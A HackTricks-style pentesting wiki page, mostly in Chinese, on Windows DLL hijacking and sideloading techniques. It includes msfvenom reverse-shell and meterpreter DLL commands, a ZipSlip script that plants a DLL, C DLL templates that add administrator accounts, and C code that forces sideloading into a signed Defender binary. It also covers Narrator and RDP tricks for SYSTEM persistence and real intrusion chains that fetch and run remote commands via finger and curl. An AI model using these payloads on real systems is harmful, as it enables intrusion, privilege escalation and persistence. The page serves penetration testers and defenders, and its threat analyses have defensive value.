# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用以加载恶意 DLL。该术语包含多种策略，如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于 code execution、实现 persistence，以及较少用于 privilege escalation。尽管这里侧重于 privilege escalation，hijacking 的方法在不同目标间保持一致。

### 常见技术

针对 DLL hijacking 有多种方法，具体效果取决于应用的 DLL 加载策略：

1. **DLL Replacement**：用恶意 DLL 替换真实 DLL，可选地使用 DLL Proxying 保留原始 DLL 功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在比合法 DLL 更靠前的搜索路径中，利用应用的搜索顺序。
3. **Phantom DLL Hijacking**：为应用创建一个恶意 DLL，使其以为这是所需但不存在的 DLL 并加载它。
4. **DLL Redirection**：修改搜索参数，如 %PATH% 或 `.exe.manifest` / `.exe.local` 文件，以将应用定向到恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在用户可控的目录中并复制应用程序，类似 Binary Proxy Execution 的技巧。

> [!TIP]
> 想要查看一个按步骤组合 HTML staging、AES-CTR 配置和 .NET implants，叠加在 DLL sideloading 之上的流程，请参考下面的工作流。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 查找缺失的 Dlls

在系统中查找缺失 Dlls 最常见的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），**设置**以下 **2 个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

并仅显示 **File System Activity**：

![](<../../../images/image (153).png>)

如果你在查找 **missing dlls in general**，请让其运行几 **秒钟**。  
如果你在查找某个特定可执行文件内的 **missing dll**，应当设置另一条过滤器，例如 "Process Name" "contains" `<exec name>`，执行它，然后停止捕获事件。

## 利用缺失的 Dlls

为了进行 escalate privileges，我们最好的机会是能够**写入一个 DLL，该 DLL 会被有特权的进程尝试加载**到某个会被搜索的**位置**。因此，我们可以在一个**在搜索顺序中位于原始 DLL 所在文件夹之前**的**文件夹**中写入 DLL（较少见的情况），或者在一个会被搜索但原始 DLL 在任何文件夹中都不存在的路径中写入 DLL。

### Dll Search Order

在 [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 中可以找到 DLL 的具体加载方式。

Windows 应用按预定义的搜索路径集合查找 DLL，遵循特定的顺序。DLL hijacking 问题发生在恶意 DLL 被故意放置在这些目录中的某处，从而在真实 DLL 之前被加载。防止此问题的一个方法是确保应用在引用所需 DLL 时使用绝对路径。

下面列出了 32-bit 系统上的 DLL 搜索顺序：

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

以上是启用 SafeDllSearchMode 时的默认搜索顺序。禁用时，当前目录会提升到第二位。要禁用此功能，请创建注册表值 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode 并将其设为 0（默认启用）。

如果以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数，则搜索从 LoadLibraryEx 正在加载的可执行模块所在目录开始。

最后请注意，DLL 也可以通过指定绝对路径而不是仅指定名称来加载。在这种情况下，该 DLL 仅会在该路径中被查找（如果该 DLL 有任何依赖项，这些依赖将像按名称加载时那样被搜索）。

还有其他改变搜索顺序的方法，但这里不再详述。

### Chaining an arbitrary file write into a missing-DLL hijack

1. 使用 ProcMon 过滤器 (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) 收集进程探测但无法找到的 DLL 名称。
2. 如果该二进制以计划任务/服务方式运行，将具有这些名称之一的 DLL 投放到应用程序目录（search-order entry #1）将在下一次执行时被加载。在一个 .NET scanner 的案例中，进程会先在 `C:\samples\app\` 查找 `hostfxr.dll`，然后才从 `C:\Program Files\dotnet\fxr\...` 加载真实副本。
3. 构建一个 payload DLL（例如 reverse shell），带任意导出：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. 如果你的原语是 ZipSlip-style 的任意写，制作一个 ZIP，其条目可逃逸解压目录，使 DLL 落入应用程序文件夹：
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 将 archive 投递到被监视的 inbox/share；当 scheduled task 重新启动该进程时，进程会加载 malicious DLL 并以 service account 的身份执行你的代码。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种高级且确定的方法来影响新创建进程的 DLL 搜索路径，是在使用 ntdll 的本地 APIs 创建进程时设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段。通过在此提供一个攻击者控制的目录，当目标进程按名称解析导入的 DLL（没有绝对路径且未使用安全加载标志）时，就可以被强制从该目录加载 malicious DLL。

关键思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供一个自定义 DllPath，指向你控制的文件夹（例如放置 dropper/unpacker 的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器会在解析过程中参考所提供的 DllPath，从而使 sideloading 变得可靠，即使 malicious DLL 未与目标 EXE 同目录。

注意/限制
- 这只影响正在创建的子进程；与 SetDllDirectory 不同，后者仅影响当前进程。
- 目标必须按名称导入或通过 LoadLibrary 加载 DLL（无绝对路径，且未使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。Forwarded exports 和 SxS 可能改变优先级。

最小 C 示例（ntdll，宽字符串，简化的错误处理）：

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

操作示例
- 将恶意 xmllite.dll（导出所需函数或代理到真实的 DLL）放入你的 DllPath 目录。
- 使用上述技术启动已签名且已知按名称查找 xmllite.dll 的二进制文件。加载器通过提供的 DllPath 解析该导入并 sideloads 你的 DLL。

该技术已在野外被观察到用于驱动多阶段 sideloading 链：初始 launcher 放置一个辅助 DLL，然后生成一个 Microsoft-signed、hijackable 的二进制文件，并使用自定义 DllPath 强制从暂存目录加载攻击者的 DLL。


#### Windows docs 中关于 dll 搜索顺序的例外

Windows 文档中记载了对标准 DLL 搜索顺序的若干例外：

- 当遇到一个 **与内存中已加载的 DLL 同名** 的 DLL 时，系统会绕过通常的搜索。相反，它会先检查重定向和 manifest，然后才回退到内存中已存在的 DLL。**在这种情况下，系统不会为该 DLL 执行搜索**。
- 如果某个 DLL 被识别为当前 Windows 版本的 **known DLL**，系统将使用其版本的 known DLL 及其任何依赖 DLL，**不进行搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 列出了这些 known DLL。
- 如果一个 **DLL 有依赖项**，对这些依赖 DLL 的搜索将如同它们仅通过其 **模块名** 指定那样进行，无论初始 DLL 是否通过完整路径识别。

### Escalating Privileges

**要求**：

- 确认一个以或将以 **不同权限**（横向或旁向移动）运行的进程，且该进程 **缺少某个 DLL**。
- 确保对将要 **搜索 DLL 的** 任意 **目录** 具有 **写访问** 权限。该位置可能是可执行文件所在目录或系统路径内的某个目录。

是的，要找到这些先决条件很困难，因为**默认情况下很少会发现一个有特权的可执行文件缺少 DLL**，而且**在系统路径文件夹上拥有写权限更是罕见**（默认情况下你是没有的）。但在配置错误的环境中这是可能的。\
如果你很幸运并满足这些要求，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便该项目的**主要目标是 bypass UAC**，你可能会在那里找到针对你所用 Windows 版本的 **PoC** 用于 Dll hijaking（可能只需更改你有写权限的文件夹路径）。

注意，你可以通过以下方式**检查你在某个文件夹的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并 **检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以检查一个 executable 的 imports 和一个 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### 示例

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **创建和编译 Dlls**

### **Dll Proxifying**

基本上，**Dll proxy** 是一个 Dll，能够**在被加载时执行你的恶意代码**，但也会通过**将所有调用转发到真实库**来**暴露**并**按预期工作**。

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

注意，在多种情况下，你编译的 DLL 必须 **导出多个函数**，这些函数将被受害进程加载，如果这些函数不存在，**二进制文件将无法加载**它们，**利用将失败**。

<details>
<summary>C DLL 模板 (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例：创建用户</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的替代 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究：Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 在启动时仍会探测一个可预测、与语言相关的本地化 DLL，该 DLL 可被劫持以实现任意代码执行和持久化。

关键要点
- 探测路径（当前版本）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 旧路径（较旧版本）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- 如果在 OneCore 路径上存在可写的且由攻击者控制的 DLL，则该 DLL 会被加载并执行 `DllMain(DLL_PROCESS_ATTACH)`。不需要任何导出。

通过 Procmon 发现
- 筛选条件：`Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- 启动 Narrator 并观察对上述路径的加载尝试。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. 要保持静默，在 attach 时枚举 Narrator 线程，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并使用 `SuspendThread` 暂停它；在自己的线程中继续执行。完整代码见 PoC。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 使用上述方法，启动 Narrator 会加载被放置的 DLL。在 secure desktop（登录屏幕）上，按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会以 SYSTEM 身份在 secure desktop 上执行。

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP 到主机，在登录屏幕按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会以 SYSTEM 身份在 secure desktop 上执行。
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置的 Accessibility Tool (AT) 注册表项（例如 CursorIndicator），编辑它以指向任意二进制/DLL，导入该项，然后将 `configuration` 设置为该 AT 名称。这样可以在 Accessibility 框架下代理任意执行。

Notes
- 向 `%windir%\System32` 写入文件并修改 HKLM 值需要 admin 权限。
- 所有 payload 逻辑可以放在 `DLL_PROCESS_ATTACH` 中；不需要导出函数。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 作为普通用户，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文中于上午 9:30 运行。
3. 如果在任务执行时有管理员登录，恶意 DLL 将在管理员会话中以中等完整性运行。
4. 串联常见的 UAC 绕过技术，将权限从中等完整性提升到 SYSTEM。

## 案例研究: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

威胁行为者经常将基于 MSI 的 dropper 与 DLL side-loading 配对，以在受信任、已签名的进程下执行 payloads。

Chain overview
- 用户下载 MSI。一个 CustomAction 在 GUI 安装期间静默运行（例如 LaunchApplication 或 VBScript action），从嵌入资源重构下一阶段。
- dropper 将一个合法的已签名 EXE 和一个恶意 DLL 写入同一目录（示例配对：Avast 签名的 wsc_proxy.exe + 攻击者控制的 wsc.dll）。
- 当已签名的 EXE 被启动时，Windows DLL 搜索顺序会优先从工作目录加载 wsc.dll，在已签名的父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 查找运行可执行文件或 VBScript 的条目。可疑示例模式：LaunchApplication 在后台执行嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中的嵌入/分割 payloads:
- 管理提取：msiexec /a package.msi /qb TARGETDIR=C:\out
- 或者使用 lessmsi：lessmsi x package.msi C:\out
- 查找多个小片段，它们会由 VBScript CustomAction 拼接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
使用 wsc_proxy.exe 的实用 sideloading
- 将这两个文件放到同一文件夹:
- wsc_proxy.exe: legitimate signed host (Avast). The process attempts to load wsc.dll by name from its directory.
- wsc.dll: attacker DLL. If no specific exports are required, DllMain can suffice; otherwise, build a proxy DLL and forward required exports to the genuine library while running payload in DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于导出需求，使用代理框架（例如 DLLirant/Spartacus）生成一个转发 DLL，同时执行你的 payload。

- 该技术依赖宿主二进制对 DLL 名称的解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），则劫持可能失败。
- KnownDLLs、SxS 和 转发导出 会影响优先级，选择宿主二进制和导出集合时必须考虑这些因素。

## 签名三件组 + 加密 payloads (ShadowPad case study)

Check Point 描述了 Ink Dragon 如何使用 **three-file triad** 部署 ShadowPad，以在与合法软件混淆的同时使核心 payload 在磁盘上保持加密：

1. **Signed host EXE** – 像 AMD、Realtek 或 NVIDIA 等厂商会被滥用（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者将可执行文件重命名为类似 Windows 的二进制（例如 `conhost.exe`），但 Authenticode 签名仍然有效。
2. **Malicious loader DLL** – 放置在 EXE 旁、具有预期名称的 DLL（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常为使用 ScatterBrain 框架混淆的 MFC 二进制；其唯一任务是定位加密 blob、解密它并反射式映射 ShadowPad。
3. **Encrypted payload blob** – 通常以 `<name>.tmp` 存放在同一目录中。将解密的 payload 内存映射后，loader 会删除 TMP 文件以销毁取证证据。

Tradecraft notes:

* 将已签名的 EXE 重命名（同时在 PE 头中保留原始的 `OriginalFileName`）可以让它伪装成 Windows 二进制但保留厂商签名，因此可仿效 Ink Dragon 的做法：投放看起来像 `conhost.exe` 的二进制，实际上是 AMD/NVIDIA 实用程序。
* 由于该可执行文件保持受信任，绝大多数允许列表控制只需要你的恶意 DLL 与之并置即可。重点在于定制 loader DLL；已签名的父程序通常可以不改动地运行。
* ShadowPad 的解密器期望 TMP blob 与 loader 同目录且可写，以便在映射后将文件置零。在 payload 加载之前保持该目录可写；一旦载入内存，TMP 文件为 OPSEC 可安全删除。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

攻击者将 DLL sideloading 与 LOLBAS 配合使用，这样磁盘上唯一的自定义工件就是放在受信任 EXE 旁边的恶意 DLL：

- **Remote command loader (Finger):** 隐藏的 PowerShell 启动 `cmd.exe /c`，从 Finger 服务器拉取命令并将其通过管道传给 `cmd`：

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` 从 TCP/79 获取文本；`| cmd` 执行服务器响应，从而允许攻击者在服务端轮换第二阶段。

- **Built-in download/extract:** 下载具有良性扩展名的归档，解压它，并在随机的 `%LocalAppData%` 文件夹下放置 sideload 目标及 DLL：

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` 隐藏进度并跟随重定向；`tar -xf` 使用 Windows 自带的 tar。

- **WMI/CIM launch:** 通过 WMI 启动 EXE，这样遥测会显示一个由 CIM 创建的进程，同时加载并列的 DLL：

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 适用于偏好本地 DLL 的二进制（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）以受信任的名称运行。

- **Hunting:** 当 `forfiles` 同时出现 `/p`、`/m` 和 `/c` 时触发告警；在管理员脚本之外很少见。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近的 Lotus Blossom 入侵滥用可信更新链，投放了一个使用 NSIS 打包的 dropper，该 dropper 分阶段部署了 DLL sideload 并实现了全内存 payload。

Tradecraft flow
- `update.exe` (NSIS) 创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，投放一个重命名的 Bitdefender Submission Wizard `BluetoothService.exe`、一个恶意的 `log.dll` 和一个加密 blob `BluetoothService`，然后启动该 EXE。
- 宿主 EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` 使用 mmap 加载该 blob；`LogWrite` 使用自定义基于 LCG 的流（常数 **0x19660D** / **0x3C6EF35F**，密钥材料从先前的哈希派生）对其解密，将缓冲区覆盖为明文 shellcode，释放临时数据，然后跳转执行。
- 为避免使用 IAT，loader 通过对导出名应用哈希（使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**），然后应用 Murmur 风格的 avalanche（**0x85EBCA6B**）并与加盐的目标哈希比较来解析 API。

Main shellcode (Chrysalis)
- 通过五轮对键 `gQ2JR&9;` 重复 add/XOR/sub 来解密一个 PE-like 的主模块，然后动态加载 `Kernel32.dll` → `GetProcAddress` 完成导入解析。
- 通过对每个字符执行位旋转/XOR 变换在运行时重建 DLL 名称字符串，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二种解析器遍历 **PEB → InMemoryOrderModuleList**，以 4 字节块并用 Murmur 风格混合解析每个导出表，仅在未找到哈希时回退到 `GetProcAddress`。

Embedded configuration & C2
- 配置位于投放的 `BluetoothService` 文件内的 **offset 0x30808**（大小 **0x980**），使用 RC4 和密钥 `qwhvb^435h&*7` 解密，暴露 C2 URL 和 User-Agent。
- Beacons 构建以点分隔的主机概要，在前面加上标签 `4Q`，然后在通过 HTTPS 的 `HttpSendRequestA` 之前使用密钥 `vAuig34%^325hGV` 进行 RC4 加密。响应被 RC4 解密并通过标签开关分发（`4T` shell，`4V` 进程执行，`4W/4X` 文件写入，`4Y` 读取/外泄，`4\\` 卸载，`4` 驱动器/文件枚举 + 分块传输等）。
- 执行模式由 CLI 参数控制：无参数 = 安装持久化（service/Run 键）指向 `-i`；`-i` 以 `-k` 重启自身；`-k` 跳过安装并运行 payload。

Alternate loader observed
- 同一次入侵投放了 Tiny C Compiler，并在 `C:\ProgramData\USOShared\` 中执行 `svchost.exe -nostdlib -run conf.c`，旁边放有 `libtcc.dll`。攻击者提供的 C 源码嵌入了 shellcode，编译并在内存中运行，未以 PE 形式写入磁盘。可使用以下方式复现：
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 这个基于 TCC 的 compile-and-run 阶段在运行时导入了 `Wininet.dll`，并从一个硬编码的 URL 拉取了第二阶段的 shellcode，提供了一个伪装成编译器运行的灵活 loader。

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
